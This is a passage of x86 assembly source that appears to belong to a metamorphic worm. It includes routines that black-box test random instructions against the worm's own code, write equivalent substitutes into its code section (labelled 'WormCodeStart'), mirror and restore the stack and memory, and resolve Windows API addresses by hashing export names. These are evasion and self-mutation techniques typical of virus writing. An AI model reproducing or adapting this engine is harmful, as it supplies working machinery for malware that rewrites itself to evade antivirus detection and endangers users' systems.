		cc rABCDPSI, sub,     dword[BBTableRandomCode+0x20], 0x08    ; two less calls. But that makes no difference
									     ; just gives a zero in the LBT if no stack change
									     ; occures, that makes further codes easier

		cc rNoEmul,  pushad		     ; Save all registers
			cc rNoEmul,  pushfd	     ; Push Flag-dword to stack
			cc rA,	     pop,     eax	      ; eax=FLAGS

			cc rNoEmul,  call,    GetGoodRandomNumber      ; new random number in dword[RandomNumber]
			cc rAB,      mov,     ebx, dword[RandomNumber] ; ebx = new random number
			cc rAB,      and,     ebx, 100011000001b       ; Just change CF, ZF, SF, OF
			cc rA,	     xor,     eax, ebx		       ; FLAGS xor (dword[RandomNumber] && 100011000000)

			cc rA,	     push,    eax,
			cc rNoEmul,  popfd

			cc rAF,       mov,     dword[BBTableFileCode+0x1C], eax
			cc rF,	      mov,     dword[BBTableRandomCode+0x1C], eax
		cc rNoEmul,  popad

		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION FC2

		VEH_END FC2

		VEH_TRY RC2

		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, RandomCodeExecution
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory

		cc rA,	     mov,     eax, BBTableRandomCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rNoRes,   mov,     dword[tmpAddress2], eax
	   ; Prepare Registers for RandomCode

		cc rA,	     mov,     eax, dword[BBTableRandomCode+0x00]
		cc rAB,      mov,     ebx, dword[BBTableRandomCode+0x04]
		cc rABC,     mov,     ecx, dword[BBTableRandomCode+0x08]
		cc rABCD,    mov,     edx, dword[BBTableRandomCode+0x0C]
		cc rABCDP,   mov,     ebp, dword[BBTableRandomCode+0x10]
		cc rABCDPS,  mov,     esi, dword[BBTableRandomCode+0x14]
		cc rABCDPSI, mov,     edi, dword[BBTableRandomCode+0x18]
		cc rABCDPSI, push,    dword[BBTableRandomCode+0x1C]   ; Flags
		cc rNoEmul,  popfd				      ; Save flags

		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION RC2

		VEH_END RC2

		cc rA,	     mov,     al, byte[bExceptionFC2]
		cc rAF,      cmp,     al, byte[bExceptionRC2]
		cc rNoEmul,  jne,     BBNotEqual	      ; If just one failed, the codes were not the same

		cc rAF,      cmp,     al, 1
		cc rNoEmul,  jne,     BBBothNoException       ; If non of them fail, continue with the standard procedure

		cc rA,	     mov,     al, byte[BBExceptionCount]   ; Both failed -> increase BBExceptionCount, check if Limit if reached

		cc rA,	     inc,     al
		cc rA,	     mov,     byte[BBExceptionCount], al
		cc rAF,      cmp,     al, 23
		cc rNoEmul,  jne,     BBOnlyExceptionLimitNotReached

		cc rNoEmul,  jmp,     BlackBoxTestingWithSimilarParameters	 ; There have been 23 exception for both commands. So lets use the original
								   ; values from primary test
		BBOnlyExceptionLimitNotReached:
		cc rNoEmul,  jmp,     PerformeAnotherBlackBoxTest

		BBBothNoException:
		cc rD,	     xor,     edx, edx		 ; Byte Counter in Table
		cc rD,	     mov,     byte[BBExceptionCount], dl
	   BBCompareNextByte:
		    ; esi = BehaviourTable (file code) -> eax
		    ; edi = TempBehaviourTable (random code) -> ebx
		    cc rDF,	 cmp,	  edx, 8
		 cc rNoEmul,	 jge,	  BBCompareNoException


		    cc rAD,	 mov,	  al, byte[tmpGBT]   ; Get the GlobalBT (1 byte) for
					       ; the current command

		    cc rAD,	 mov,	  ah, 1 	     ; ah = 1
		    cc rAD,	 xchg,	  cl, dl	     ; change
		    cc rAD,	 shl,	  ah, cl	     ;
		    cc rAD,	 xchg,	  cl, dl	     ; Back
					       ; al = GBT
					       ; ah = 1 shl dl
		    cc rADF,	  and,	   al, ah
		 cc rNoEmul,	 jz, BBNoNeedForComparing

		 BBCompareNoException:

		    cc rAD,	 mov,	  eax, dword[BBTableFileCode+edx*4]
		    cc rABD,	 mov,	  ebx, dword[BBTableRandomCode+edx*4]
		    cc rADF,	 cmp,	  eax, ebx
		    cc rNoEmul,  jne,	  BBNotEqual

	     BBNoNeedForComparing:
		cc rD,	 inc,	  edx
		cc rDF,  cmp,	  edx, (BehaviourTableSize)/4
	   cc rNoEmul,	jb,   BBCompareNextByte

	; EQUAL!!!

	   cc rC,      pop,	ecx
	   cc rC,      inc,	ecx
	   cc rC,      push,	ecx

	   cc rAC,     mov,	al, byte[tmpGBT]
	   cc rACF,    and,	al, 10000000b	     ; FLAGS?
	   cc rNoEmul, jnz,	BBEndCheckWithFlags  ; If compare flags, do more BlackBox tests

	   cc rCF,     cmp,	ecx, 100
	cc rNoEmul, js, PerformeAnotherBlackBoxTest

	BBEndCheckWithFlags:
	   cc rCF,     cmp,	ecx, 1000
	cc rNoEmul, js, PerformeAnotherBlackBoxTest

	BBFoundEqual:
	cc rNoRes,   pop,     eax	      ; Trash

	cc rNoEmul,  popad
	cc rA,	     xor,     eax, eax
cc rNoEmul,  ret


   BBNotEqual:
	cc rNoRes,   pop,     eax	      ; Trash

	cc rNoEmul,  popad
	cc rA,	     mov, eax, -1
cc rNoEmul, ret




BlackBoxTestingWithSimilarParameters:
		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, FileCodeExection
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory

		cc rA,	     mov,     eax, BBTableFileCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rNoRes,   mov,     dword[tmpAddress2], eax

		VEH_TRY FC2SIM


	   ; Prepare Registers and BehaviourTables
	   ; But this time with similar values as for primary test


		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEAX]
		cc rA,	     mov,     dword[BBTableFileCode+0x00], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x00], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEBX]
		cc rA,	     mov,     dword[BBTableFileCode+0x04], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x04], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rECX]
		cc rA,	     mov,     dword[BBTableFileCode+0x08], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x08], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEDX]
		cc rA,	     mov,     dword[BBTableFileCode+0x0C], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x0C], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEBP]
		cc rA,	     mov,     dword[BBTableFileCode+0x10], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x10], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rESI]
		cc rA,	     mov,     dword[BBTableFileCode+0x14], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x14], eax

		cc rNoEmul,  call,    BBSimSpecialRndNum
		cc rA,	     add,     eax, dword[rEDI]
		cc rA,	     mov,     dword[BBTableFileCode+0x18], eax
		cc rNoRes,   mov,     dword[BBTableRandomCode+0x18], eax

		cc rA,	     mov,     eax, dword[BBTableRandomCode+0x00]
		cc rAB,      mov,     ebx, dword[BBTableRandomCode+0x04]
		cc rABC,     mov,     ecx, dword[BBTableRandomCode+0x08]
		cc rABCD,    mov,     edx, dword[BBTableRandomCode+0x0C]
		cc rABCDP,   mov,     ebp, dword[BBTableRandomCode+0x10]
		cc rABCDPS,  mov,     esi, dword[BBTableRandomCode+0x14]
		cc rABCDPSI, mov,     edi, dword[BBTableRandomCode+0x18]

		cc rABCDPSI, mov,     dword[BBTableFileCode+0x20], esp
		cc rABCDPSI, mov,     dword[BBTableRandomCode+0x20], esp

		cc rABCDPSI, sub,     dword[BBTableFileCode+0x20], 0x08       ; esp is esp+8 here because of
		cc rABCDPSI, sub,     dword[BBTableRandomCode+0x20], 0x08     ; two less calls. But that makes no difference
								; just gives a zero in the LBT if no stack change
								; occures, that makes further codes easier


		cc rNoEmul,  pushad		; Save all registers
			cc rNoEmul,  pushfd	; Push Flag-dword to stack
			cc rA,	     pop,     eax     ; eax=FLAGS

			cc rNoEmul,  call,    GetGoodRandomNumber	      ; new random number in dword[RandomNumber]
			cc rAB,      mov,     ebx, dword[RandomNumber]	      ; ebx = new random number

			cc rAB,      and,     ebx, 100011000001b	      ; Just change CF, ZF, SF, OF

			cc rA,	     xor,     eax, ebx		    ; FLAGS xor (dword[RandomNumber] && 100011000001)

			cc rA,	     push,    eax
			cc rNoEmul,  popfd

			cc rAF,      mov,     dword[BBTableFileCode+0x1C], eax
			cc rF,	     mov,     dword[BBTableRandomCode+0x1C], eax
		cc rNoEmul,  popad


		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION FC2SIM

		VEH_END FC2SIM


		VEH_TRY RC2SIM

		cc rA,	     mov,     eax, CodeExecDifference
		cc rAB,      mov,     ebx, RandomCodeExecution
		cc rNoEmul,  call,    GenerateExecuteableCodeInMemory


		cc rA,	     mov,     eax, BBTableRandomCode
		cc rA,	     mov,     dword[tmpAddress], eax
		cc rA,	     mov,     dword[tmpAddress1], eax
		cc rA,	     mov,     dword[tmpAddress2], eax
	   ; Prepare Registers for RandomCode
		cc rA,	     mov,     eax, dword[BBTableRandomCode+0x00]
		cc rAB,      mov,     ebx, dword[BBTableRandomCode+0x04]
		cc rABC,     mov,     ecx, dword[BBTableRandomCode+0x08]
		cc rABCD,    mov,     edx, dword[BBTableRandomCode+0x0C]
		cc rABCDP,   mov,     ebp, dword[BBTableRandomCode+0x10]
		cc rABCDPS,  mov,     esi, dword[BBTableRandomCode+0x14]
		cc rABCDPSI, mov,     edi, dword[BBTableRandomCode+0x18]
		cc rABCDPSI, push,    dword[BBTableRandomCode+0x1C]   ; Flags
		cc rNoEmul,  popfd,				      ; Save flags

;                mov,     esp, dword[eax+0x20]           ; should be the same
;                cc rNoEmul,  call,    RandomCodeExecution2

		cc rNoEmul,  call,    dword[hExecutionMirror]

		VEH_EXCEPTION RC2SIM

		VEH_END RC2SIM

		cc rA,	     mov,     al, byte[bExceptionFC2SIM]
		cc rAF,      cmp,     al, byte[bExceptionRC2SIM]
		cc rNoEmul,  jne,     BBNotEqual	      ; If just one failed, the codes were not the same

		cc rAF,      cmp,     al, 1
		cc rNoEmul,  jne,     BBSimBothNoException	 ; If non of them fail, continue with the standard procedure

		cc rA,	     mov,     al, byte[BBExceptionCount]   ; Both failed -> increase BBExceptionCount, check if Limit if reached
		cc rA,	     inc,     al
		cc rA,	     mov,     byte[BBExceptionCount], al

		cc rAF,      cmp,     al, 23
		cc rNoEmul,  je,      BBNotEqual

		cc rNoEmul,  jmp,     PerformeAnotherBlackBoxTest

		BBSimBothNoException:
		cc rD,	     xor,     edx, edx		 ; Byte Counter in Table
		cc rNoRes,   mov,     byte[BBExceptionCount], dl
	   BBSimCompareNextByte:
		    ; esi = BehaviourTable (file code) -> eax
		    ; edi = TempBehaviourTable (random code) -> ebx
		    cc rDF,   cmp,     edx, 8
		 cc rNoEmul, jge,     BBSimCompareNoException


		    cc rAD,   mov,     al, byte[tmpGBT]   ; Get the GlobalBT (1 byte) for
							 ; the current command

		    cc rAD,   mov,     ah, 1		  ; ah = 1
		    cc rACD,  xchg,    cl, dl		  ; change
		    cc rACD,  shl,     ah, cl		  ;
		    cc rACD,  xchg,    cl, dl		  ; Back
					       ; al = GBT
					       ; ah = 1 shl dl
		    cc rADF,  and,     al, ah
		 cc rNoEmul,  jz BBSimNoNeedForComparing

		 BBSimCompareNoException:

		    cc rAD,	mov,	 eax, dword[BBTableFileCode+edx*4]
		    cc rABD,	mov,	 ebx, dword[BBTableRandomCode+edx*4]
		    cc rABDF,	cmp,	 eax, ebx
		    cc rNoEmul, jne,	 BBNotEqual

	     BBSimNoNeedForComparing:
		cc rAD,     inc,     edx
		cc rADF,    cmp,     edx, (BehaviourTableSize)/4
	   cc rNoEmul,	jb,   BBSimCompareNextByte

	; EQUAL!!!

	   cc rC,      pop,	ecx
	   cc rC,      inc,	ecx
	   cc rC,      push,	ecx

	   cc rAC,     mov,	al, byte[tmpGBT]
	   cc rACF,    and,	al, 10000000b		    ; FLAGS?
	   cc rNoEmul, jnz     BBSimEndCheckWithFlags	    ; If compare flags, do more BlackBox tests

	   cc rCF,     cmp,	ecx, 100
	cc rNoEmul, js, BlackBoxTestingWithSimilarParameters
		; Uuuhh yeah! :D
		; Found some nice memory equivalent!
cc rNoEmul,  jmp,     BBFoundEqual


	BBSimEndCheckWithFlags:
	   cc rCF,   cmp,     ecx, 1000
	cc rNoEmul,  js, BlackBoxTestingWithSimilarParameters
		; Uuuhh yeah! :D
		; Found some nice memory equivalent!
cc rNoEmul,  jmp,     BBFoundEqual


; #####
; #####   BlackBox Testing
; #####   Send in different parameters and compare output
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
; #####   Substitute original command with equivalent commands
; #####

SubstituteCommand:
; In: ecx=command number
;     qword[RandomCode] ... random code which will substitute the original one

	cc rNoEmul,  pushad

	cc rNoRes,   push,    ecx
	cc rNoEmul,  call,    CloseRandomFile	      ; With read protection-flag
	cc rNoEmul,  call,    OpenRandomFileWrite     ; With write protection-flag
	cc rC,	     pop,     ecx

	cc rCD,      xor,     edx, edx
	cc rAD,      mov,     eax, ecx
	cc rABD,     mov,     ebx, 8
	cc rA,	     mul,     ebx      ; EDX:EAX=EAX*EBX=Command Number*8

	cc rAS,      mov,     esi, RandomCode
	cc rSI,      mov,     edi, eax
	cc rSI,      add,     edi, dword[WormCodeStart]

	cc rASI,     mov,     eax, dword[esi]
	cc rSI,      mov,     dword[edi], eax
	cc rASI,     mov,     eax, dword[esi+4]
	cc rSI,      mov,     dword[edi+4], eax

	cc rNoEmul,  call,    CloseRandomFile	      ; With write protection-flag
	cc rNoEmul,  call,    OpenRandomFileRead      ; With read protection-flag

	cc rNoEmul,  popad
cc rNoEmul,  jmp, SubstituteCommandEnd


; #####
; #####   Substitute original command with equivalent commands
; #####
; ###########################################################################
; ###########################################################################


; ###########################################################################
; ###########################################################################
; #####
; #####   Mirroring/Restoring the stack/memory
; #####

MirrorTheStack:
	cc rP,	    pop,     ebp	     ; The only different thing
					     ; should the the current return value
	cc rNoRes,  mov,     dword[tmpRetVal], ebp

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READWRITE
	cc rNoRes,  push,    dword[hStackSize]
	cc rNoRes,  push,    dword[hStackMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]	      ; Write Protection Flag

	cc rA,	    mov,     eax, dword[hStackMirror]
	cc rAD,     mov,     edx, dword[hStackSize]	  ; Size of stack
	cc rADS,    mov,     esi, dword[hStackStart]	  ; Start of stack
	cc rADSI,   mov,     edi, eax  ; VirtualMemory for Stack
	cc rCDSI,   xor,     ecx, ecx

	MirrorTheStackMore:
		cc rACDSI,  mov,     eax, dword[esi]
		cc rACDSI,  mov,     dword[edi], eax
		cc rCDSI,   add,     edi, 4
		cc rCDSI,   add,     esi, 4
		cc rCDSI,   add,     ecx, 4
		cc rCDSIF,  cmp,     ecx, edx
	cc rNoEmul,  jb,      MirrorTheStackMore

	cc rNoRes,  push,    tmpMemProtection
	cc rNoRes,  push,    PAGE_READONLY
	cc rNoRes,  push,    dword[hStackSize]
	cc rNoRes,  push,    dword[hStackMirror]
	cc rNoEmul, stdcall, dword[_VirtualProtect]	      ; Protect it!

	cc rP,	    mov,     ebp, dword[tmpRetVal]
	cc rNoRes,  push,    ebp		     ; Current return-value
cc rNoEmul, ret


RestoreTheStack:
	cc rP,	    pop,     ebp	     ; The only different thing
				 ; should the the current return value

	cc rDP,     mov,     edx, dword[hStackSize]	 ; Size of stack
	cc rDPS,    mov,     esi, dword[hStackMirror]	 ; VirtualMemory for Stack
	cc rDPSI,   mov,     edi, dword[hStackStart]	 ; Start of Stack
	cc rCDPSI,  xor,     ecx, ecx

	RestoreTheStackMore:
		cc rACDPSI, mov,     eax, dword[esi]
		cc rCDPSI,  mov,     dword[edi], eax
		cc rCDPSI,  add,     edi, 4
		cc rCDPSI,  add,     esi, 4
		cc rCDPSI,  add,     ecx, 4
		cc rCDPSIF, cmp,     ecx, edx
	cc rNoEmul,  jb,      RestoreTheStackMore

	cc rNoRes,  push,    ebp		     ; Current return-value
cc rNoEmul,  ret


RestoreTheMemory:
	cc rC,	    xor,     ecx, ecx
	cc rC,	    mov,     dword[tmpMemProtection], ecx

	cc rCS,     mov,     esi, dword[hDataMirror]
	cc rCSI,    mov,     edi, DataStart

	RestoreTheMemoryMore:
		cc rACSI,   mov,     eax, dword[esi]
		cc rCSI,    mov,     dword[edi], eax
		cc rCSI,    add,     esi, 4
		cc rCSI,    add,     edi, 4
		cc rCSI,    add,     ecx, 4
		cc rCSIF,   cmp,     ecx, (DataEnd-DataStart)
	cc rNoEmul,  jb,      RestoreTheMemoryMore

	cc rA,	    xor,     eax, eax
	cc rNoRes,  mov,     dword[tmpMemProtection], eax
cc rNoEmul,  ret


MirrorTheMemory:

	cc rBCDPSIF,  mov, dword[tmpDWA], eax
	cc rBDPSIF,   mov, dword[tmpDWC], ecx
	cc rNoEmul,   pushfd
	cc rBCDPSIF,  pop,     ecx	       ; ecx=flags

	cc rBCDPSIF, pop, dword[tmpDWB]       ; Return address

				; There could be 8 pop, or push

	cc rBCDPSIF, pop, dword[tmpDW1]       ; 1st
	cc rBCDPSIF, pop, dword[tmpDW2]       ; 2nd
	cc rBCDPSIF, pop, dword[tmpDW3]       ; 3nd
	cc rBCDPSIF, pop, dword[tmpDW4]       ; 4nd
	cc rBCDPSIF, pop, dword[tmpDW5]       ; 5st
	cc rBCDPSIF, pop, dword[tmpDW6]       ; 6nd
	cc rBCDPSIF, pop, dword[tmpDW7]       ; 7nd
	cc rBCDPSIF, pop, dword[tmpDW8]       ; 8nd

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rNoEmul,   call,   GetRandomNumber
	cc rABCDPSIF,mov,     eax, dword[RandomNumber]
	cc rBCDPSIF, push,    eax

	cc rBCDPSIF, push,    dword[tmpDWB]
	cc rABCDPSIF,mov,     eax, dword[tmpDWA]

	cc rABCDPSIF,push,    ecx	    ; ecx=flags -> pushfd
	cc rABCDPSIF,mov,     ecx, dword[tmpDWC]

	cc rNoEmul,  pushad
		cc rNoEmul,  call,    CreateRandomizedData

		cc rNoRes,   push,    tmpMemProtection
		cc rNoRes,   push,    PAGE_READWRITE
		cc rNoRes,   push,    (DataEnd-DataStart)
		cc rNoRes,   push,    dword[hDataMirror]
		cc rNoEmul,  stdcall, dword[_VirtualProtect]
		cc rA,	     xor, eax, eax
		cc rNoRes,   mov,     dword[tmpMemProtection], eax


		cc rC,	     xor,     ecx, ecx
		cc rCS,      mov,     esi, DataStart
		cc rCSI,     mov,     edi, dword[hDataMirror]

		MirrorTheMemoryMore:
			cc rACSI,    mov,     eax, dword[esi]
			cc rCSI,     mov,     dword[edi], eax
			cc rCSI,     add,     esi, 4
			cc rCSI,     add,     edi, 4
			cc rCSI,     add,     ecx, 4

			cc rCSIF,    cmp,     ecx, (DataEnd-DataStart)
		cc rNoEmul,  jb,      MirrorTheMemoryMore


		cc rNoRes,  push,    tmpMemProtection
		cc rNoRes,  push,    PAGE_READONLY
		cc rNoRes,  push,    (DataEnd-DataStart)
		cc rNoRes,  push,    dword[hDataMirror]
		cc rNoEmul, stdcall, dword[_VirtualProtect]
		cc rA,	    xor, eax, eax
		cc rNoRes,  mov,     dword[tmpMemProtection], eax

		cc rC,	    xor,     ecx, ecx

		cc rCS,     mov,     esi, dword[hRandomizedData]
		cc rCSI,    mov,     edi, DataStart

		MirrorTheMemoryWriteRandomStuff:
			cc rACSI,   mov,     eax, dword[esi]
			cc rCSI,    mov,     dword[edi], eax
			cc rCSI,    add,     esi, 4
			cc rCSI,    add,     edi, 4
			cc rCSI,    add,     ecx, 4

			cc rCSIF,   cmp,     ecx, (DataEnd-DataStart)
		cc rNoEmul,  jb,    MirrorTheMemoryWriteRandomStuff
	cc rNoEmul, popad
	cc rNoEmul, popfd
cc rNoEmul, ret


CreateRandomizedData:
       cc rNoRes,  push,     tmpMemProtection
       cc rNoRes,  push,     PAGE_READWRITE
       cc rNoRes,  push,     (DataEnd-DataStart)
       cc rNoRes,  push,     dword[hRandomizedData]
       cc rNoEmul, stdcall,  dword[_VirtualProtect]

       cc rC,	   xor,      ecx, ecx
       cc rCI,	   mov,      edi, dword[hRandomizedData]
       CreateRandomizedDataMore:
		cc rNoEmul, call,     GetRandomNumber
		cc rACI,    mov,      eax, dword[RandomNumber]
		cc rCI,     mov,      dword[edi], eax
		cc rCI,     add,      edi, 4
		cc rCI,     add,      ecx, 4
		cc rCIF,    cmp,      ecx, (DataEnd-DataStart)
       cc rNoEmul,  jb,     CreateRandomizedDataMore

       cc rA,	    mov,      eax, dword[hDataMirror]
       cc rAC,	    mov,      ecx, (hDataMirror-DataStart)
       cc rACI,     mov,      edi, dword[hRandomizedData]
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hDataMirror1-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hDataMirror2-DataStart)
       cc rI,	    mov,      dword[edi+ecx], eax

       cc rAI,	    mov,      eax, dword[tmpAddress1]
       cc rACI,     mov,      ecx, (tmpAddress-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (tmpAddress1-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (tmpAddress2-DataStart)
       cc rI,	    mov,      dword[edi+ecx], eax

       cc rAI,	    mov,      eax, dword[hTempAlloc1]
       cc rACI,     mov,      ecx, (hTempAlloc1-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hTempAlloc2-DataStart)
       cc rI,	    mov,      dword[edi+ecx], eax

       cc rAI,	    mov,      eax, dword[hRandomizedData]
       cc rACI,     mov,      ecx, (hRandomizedData-DataStart)
       cc rAI,	    mov,      dword[edi+ecx], eax

       cc rACI,     mov,      ecx, (hRandomizedData1-DataStart)
       cc rNoRes,   mov,      dword[edi+ecx], eax

       cc rNoRes,   push,    tmpMemProtection
       cc rNoRes,   push,    PAGE_READONLY
       cc rNoRes,   push,    (DataEnd-DataStart)
       cc rNoRes,   push,    dword[hRandomizedData]
       cc rNoEmul,  stdcall, dword[_VirtualProtect]
 cc rNoEmul,  ret

; #####
; #####   Mirroring/Restoring the memory
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
; #####   Find addresses of APIs
; #####

GetAllAPIAddresses:
	cc rA,	     mov,     eax, "kern"
	cc rNoRes,   mov,     dword[_DLLkernel32+0x00], eax
	cc rA,	     mov,     eax, "el32"
	cc rNoRes,   mov,     dword[_DLLkernel32+0x04], eax
	cc rA,	     mov,     eax, ".dll"
	cc rNoRes,   mov,     dword[_DLLkernel32+0x08], eax

	cc rA,	     mov,     eax, APIMagicNumbersKernel32
	cc rNoRes,   mov,     dword[APICurrentMagicNum], eax
	cc rA,	     mov,     eax, APINumbersKernel
	cc rNoRes,   mov,     dword[APICurrentNumber], eax
	cc rA,	     mov,     eax, APIAddressesKernel
	cc rNoRes,   mov,     dword[APICurrentAddress], eax

	cc rNoRes,   push,    _DLLkernel32
	cc rNoEmul,  stdcall, dword[LoadLibrary]
	cc rNoRes,   mov,     dword[hDLLkernel32], eax

	cc rNoEmul,  call,    FindAPIsInLibrary

	cc rA,	     mov,     eax, "adva"
	cc rNoRes,   mov,     dword[_DLLadvapi32+0x00], eax
	cc rA,	     mov,     eax, "pi32"
	cc rNoRes,   mov,     dword[_DLLadvapi32+0x04], eax
	cc rA,	     mov,     eax, ".dll"
	cc rNoRes,   mov,     dword[_DLLadvapi32+0x08], eax

	cc rA,	     mov,     eax, APIMagicNumbersAdvapi32
	cc rNoRes,   mov,     dword[APICurrentMagicNum], eax
	cc rA,	     mov,     eax, APINumbersAdvapi
	cc rNoRes,   mov,     dword[APICurrentNumber], eax
	cc rA,	     mov,     eax, APIAddressesAdvapi
	cc rNoRes,   mov,     dword[APICurrentAddress], eax

	cc rNoRes,   push,    _DLLadvapi32
	cc rNoEmul,  stdcall, dword[LoadLibrary]
	cc rNoRes,   mov,     dword[hDLLkernel32], eax

	cc rNoEmul,  call,    FindAPIsInLibrary

	cc rA,	     mov,     eax, dword[_VirtualAlloc]
	cc rNoRes,   mov,     dword[_VirtualAlloc1], eax
	cc rA,	     mov,     eax, dword[_VirtualProtect]
	cc rNoRes,   mov,     dword[_VirtualProtect1], eax
cc rNoEmul, ret


FindAPIsInLibrary:
; In: eax = handle to DLL

	cc rAB,     mov,     ebx, dword[eax+0x3C]
	cc rAB,     add,     ebx, eax			     ; relative -> absolut
	cc rAB,     mov,     dword[hKernelPE], ebx

	cc rAS,     mov,     esi, dword[ebx+0x78]
	cc rAS,     add,     esi, eax			     ; relative -> absolut
	cc rAS,     add,     esi, 0x1C

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax
	cc rAS,     mov,     dword[hAddressTable], ebx
	cc rAS,     add,     esi, 0x4

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax			     ; relative -> absolut
	cc rAS,     mov,     dword[hNamePointerTable], ebx
	cc rAS,     add,     esi, 0x4

	cc rABS,    mov,     ebx, dword[esi]
	cc rABS,    add,     ebx, eax			     ; relative -> absolut
	cc rAS,     mov,     dword[hOrdinalTable], ebx

	cc rS,	    mov,     esi, dword[hNamePointerTable]
	cc rSI,     mov,     edi, dword[APICurrentAddress]
	cc rDSI,    mov,     edx, dword[APICurrentMagicNum]

	cc rDSI,     sub,     esi, 4
	cc rDPSI,    xor,     ebp, ebp
	cc rDPSI,    dec,     ebp

	cc rCDPSI,   xor,     ecx, ecx

	FindAPIsInLibraryGetNextAPI:
	cc rNoEmul,  pushad
		FindAPIsInLibraryNext:
			cc rDPSI,   inc,     ebp
			cc rDPSI,   add,     esi, 4
			cc rBDPSI,  mov,     ebx, dword[esi]
			cc rBDPSI,  add,     ebx, dword[hDLLkernel32]

			cc rNoEmul, call,    FindAPIGiveMeTheHash

			cc rADPSIF, cmp,     eax, dword[edx]
		cc rNoEmul, jne,     FindAPIsInLibraryNext


		cc rPSI,     mov,     esi, ebp	  ; coutner
		cc rPSI,     shl,     esi, 0x1	  ; esi*=2
	
		cc rPSI,     add,     esi, dword[hOrdinalTable]   ; esi=Pointer to ordinal table
		cc rBPSI,    xor,     ebx, ebx			  ; ebx=0
		cc rBPSI,    mov,     ebx, dword[esi]		  ; bx=Ordinal
		cc rBPSI,    and,     ebx, 0xFFFF

		cc rBPSI,    shl,     ebx, 0x2			  ; ebx=Ordinal*4
		cc rBPSI,    add,     ebx, dword[hAddressTable]   ; ebx=Pointer to Address of API
		cc rBPSI,    mov,     ebx, dword[ebx]
		cc rBPSI,    add,     ebx, dword[hDLLkernel32]	  ; relative -> absolut
		cc rPSI,     mov,     dword[edi], ebx
	cc rNoEmul,  popad
	cc rCDPSI,   inc,     ecx
	cc rCDPSI,   add,     edi, 4
	cc rCDPSI,   add,     edx, 4
	cc rCDPSIF,  cmp,     ecx, dword[APICurrentNumber]
	cc rNoEmul,  jb,      FindAPIsInLibraryGetNextAPI
cc rNoEmul, ret


FindAPIGiveMeTheHash:
; In: ebx=pointer to API name
; Out: eax=Hash   (in ax)
; changed: eax
;        mov,     ebx, apistr

	cc rBCDPSI, push,    ebx
	cc rBDPSI,  push,    ecx
	cc rBPSI,   push,    edx
	cc rABPSI,  xor,     eax, eax
	cc rABCPSI, xor,     ecx, ecx
	cc rABCPSI, dec,     ebx
	FindAPIGiveMeTheHashMore:
		cc rABCPSI,   xor,     eax, ecx
		cc rABCPSI,   inc,     ebx
		cc rABCPSI,   mov,     ecx, dword[ebx]
		cc rABCDPSI,  mov,     edx, ecx        ; ecx=nooo - n ... new byte
		cc rABCDPSI,  shr,     edx, 24	       ; edx=000n ... new byte
		cc rABCDPSIF, cmp,     dl, 0	       ; dl=n
	cc rNoEmul, jne,     FindAPIGiveMeTheHashMore

	cc rABPSI,   sub,     al, byte[ebx+0]
	cc rABPSI,   add,     ah, byte[ebx+1]
	cc rABPSI,   xor,     al, byte[ebx+2]

	cc rAPSI,    and,     eax, 0xFFFF
	cc rADPSI,   pop,     edx
	cc rACDPSI,  pop,     ecx
	cc rABCDPSI, pop,     ebx
cc rNoEmul, ret

; #####
; #####   Find addresses of APIs
; #####
; ###########################################################################
; ###########################################################################

; ###########################################################################
; ###########################################################################
; #####
